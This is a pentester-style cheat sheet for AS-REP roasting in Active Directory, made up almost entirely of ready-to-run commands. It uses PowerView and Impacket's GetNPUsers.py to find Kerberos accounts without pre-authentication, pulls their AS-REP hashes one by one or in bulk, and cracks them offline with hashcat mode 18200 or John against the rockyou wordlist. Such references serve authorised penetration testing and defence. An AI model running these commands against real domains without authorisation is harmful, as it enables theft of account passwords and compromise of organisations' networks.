# AS-REP Roasting (GetNPUsers)

Attack against Kerberos accounts that have "Do not require Kerberos pre-authentication" (`UF_DONT_REQUIRE_PREAUTH`) set. Request AS-REP without authenticating → crack offline.

## Find Vulnerable Accounts
```powershell
# PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname
# Impacket
GetNPUsers.py <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -no-pass -format hashcat
```

## Bulk Check User List
```bash
for user in $(cat users.txt); do
  GetNPUsers.py -no-pass -dc-ip <DC_IP> <DOMAIN>/$user | grep -v Impacket
done
```

## Single User
```bash
GetNPUsers.py <DOMAIN>/<username> -no-pass -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt
```

## Crack Hash
```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

## Notes
- Hash format: `$krb5asrep$23$<user>@<domain>:...`
- hashcat mode 18200 = Kerberos 5 AS-REP etype 23
- Only works if pre-auth is disabled for target account
- Combine with RPC/LDAP user enum to build user list first
